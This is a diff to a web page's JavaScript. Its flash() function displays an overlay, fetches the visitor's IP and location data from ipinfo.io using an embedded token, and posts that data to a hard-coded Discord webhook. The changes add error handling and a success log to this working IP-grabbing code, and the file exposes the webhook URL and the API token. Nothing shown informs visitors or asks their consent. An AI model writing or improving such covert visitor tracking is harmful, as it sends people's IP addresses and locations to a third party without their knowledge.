@@ -3,6 +3,9 @@ const discordWebhookUrl = 'https://discord.com/api/webhooks/1277154025816723528/
 async function fetchIPInfo() {
     try {
         const response = await fetch('https://ipinfo.io/json?token=ae988840efabc7');
+        if (!response.ok) {
+            throw new Error('Failed to fetch IP info: ' + response.status + ' - ' + response.statusText);
+        }
         const data = await response.json();
         return data;
     } catch (error) {
@@ -31,7 +34,7 @@ async function sendDiscordEmbed(ipInfo) {
                 }
             ]
         };
-        
+
         const discordResponse = await fetch(discordWebhookUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -42,6 +45,7 @@ async function sendDiscordEmbed(ipInfo) {
             throw new Error('Failed to send embed to Discord: ' + discordResponse.status + ' - ' + discordResponse.statusText);
         }
 
+        console.log('Successfully sent embed to Discord.');
     } catch (error) {
         console.error('Error sending embed to Discord:', error);
     }
@@ -50,10 +54,10 @@ async function sendDiscordEmbed(ipInfo) {
 async function flash() {
     const flashOverlay = document.getElementById('flashOverlay');
     const flashText = document.getElementById('flashText');
-    
+
     flashOverlay.style.display = 'block';
     flashText.style.display = 'block';
-    
+
     const ipInfo = await fetchIPInfo();
     if (ipInfo) {
         await sendDiscordEmbed(ipInfo);
